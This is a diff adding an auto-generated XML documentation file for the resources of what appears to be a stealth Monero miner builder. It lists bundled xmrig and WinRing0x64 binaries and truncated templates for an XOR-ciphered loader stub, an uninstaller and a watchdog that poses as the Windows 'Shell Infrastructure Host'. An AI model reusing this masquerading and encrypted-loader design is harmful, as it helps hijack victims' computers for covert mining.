@@ -1,0 +1,176 @@
+﻿<?xml version="1.0"?>
+<doc>
+<assembly>
+<name>
+project
+</name>
+</assembly>
+<members>
+<member name="P:project.My.Resources.Resources.ResourceManager">
+	<summary>
+  Returns the cached ResourceManager instance used by this class.
+</summary>
+</member><member name="P:project.My.Resources.Resources.Culture">
+	<summary>
+  Overrides the current thread's CurrentUICulture property for all
+  resource lookups using this strongly typed resource class.
+</summary>
+</member><member name="P:project.My.Resources.Resources.administrator">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:project.My.Resources.Resources.Compilers">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:project.My.Resources.Resources.Includes">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:project.My.Resources.Resources.libs">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:project.My.Resources.Resources.microsoft_admin">
+	<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member><member name="P:project.My.Resources.Resources.Monero">
+	<summary>
+  Looks up a localized resource of type System.Drawing.Icon similar to (Icon).
+</summary>
+</member><member name="P:project.My.Resources.Resources.MoneroPNG">
+	<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member><member name="P:project.My.Resources.Resources.Program">
+	<summary>
+  Looks up a localized string similar to using System;
+using System.Diagnostics;
+using System.IO;
+using System.IO.Compression;
+using System.Management;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.Security.Principal;
+using System.Text;
+using System.Threading;
+#if DefDebug
+using System.Windows.Forms;
+#endif
+
+#if DefAssembly
+[assembly: AssemblyTitle("%Title%")]
+[assembly: AssemblyDescription("%Description%")]
+[assembly: AssemblyCompany("%Company%")]
+[assembly: AssemblyProduct("%Produ [rest of string was truncated]";.
+</summary>
+</member><member name="P:project.My.Resources.Resources.Program1">
+	<summary>
+  Looks up a localized string similar to #include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;sys/types.h&gt;
+#include "Includes/syscalls.h"
+
+/* Created by Unam Sanctam, https://github.com/UnamSanctam */
+
+char* cipher(char* data, long dataLen) {
+	char* output = (char*)malloc(sizeof(char) * dataLen+1);
+	output[dataLen] = 0;
+	for (int i = 0; i &lt; dataLen; i++) {
+		output[i] = data[i] ^ "#KEY"[i % #KEYLENGTH];
+	}
+	return output;
+}
+
+int main(int argc, char** argv) {
+	Sleep(#DELAY * 1000);
+
+	PROCESS_INFORMATION p_info;
+	STARTUPINFO s_info  [rest of string was truncated]";.
+</summary>
+</member><member name="P:project.My.Resources.Resources.resource">
+	<summary>
+  Looks up a localized string similar to #ifdef DefIcon
+MAINICON ICON "#ICON"
+#endif
+#ifdef DefAdmin
+1 24 "administrator.manifest"
+#endif
+#ifdef DefAssembly
+1 VERSIONINFO
+FILEVERSION     #VERSION
+PRODUCTVERSION  #VERSION
+BEGIN
+    BLOCK "StringFileInfo"
+    BEGIN
+        BLOCK "040904b0"
+        BEGIN
+            VALUE "CompanyName", "#COMPANY"
+			VALUE "FileTitle", "#TITLE"
+            VALUE "FileDescription", "#DESCRIPTION"
+            VALUE "FileVersion", "#VERSION"
+            VALUE "LegalCopyright", "#COPYRIGHT"
+			VALUE "LegalTrademark", "#T [rest of string was truncated]";.
+</summary>
+</member><member name="P:project.My.Resources.Resources.Uninstaller">
+	<summary>
+  Looks up a localized string similar to using System;
+using System.IO;
+using System.Reflection;
+using System.Security.Principal;
+using System.Security.Cryptography;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Resources;
+using System.Threading;
+using System.Diagnostics;
+using Microsoft.Win32;
+using System.Collections.Generic;
+using System.Management;
+#if DefDebug
+using System.Windows.Forms;
+#endif
+
+public partial class RUninstaller
+{
+    public static string _rbD_ = (Environment.GetFolderPath(Environment.SpecialFolder.App [rest of string was truncated]";.
+</summary>
+</member><member name="P:project.My.Resources.Resources.Watchdog">
+	<summary>
+  Looks up a localized string similar to using System;
+using System.Diagnostics;
+using System.IO;
+using System.Management;
+using System.Reflection;
+using System.Security.Principal;
+using System.Security.Cryptography;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading;
+#if DefDebug
+using System.Windows.Forms;
+#endif
+
+[assembly: AssemblyTitle("Shell Infrastructure Host")]
+[assembly: AssemblyDescription("Shell Infrastructure Host")]
+[assembly: AssemblyProduct("Microsoft® Windows® Operating System")]
+[assembly: AssemblyCop [rest of string was truncated]";.
+</summary>
+</member><member name="P:project.My.Resources.Resources.WinRing0x64">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:project.My.Resources.Resources.xmrig">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="T:project.My.Resources.Resources">
+	<summary>
+  A strongly-typed resource class, for looking up localized strings, etc.
+</summary>
+</member>
+</members>
+</doc>
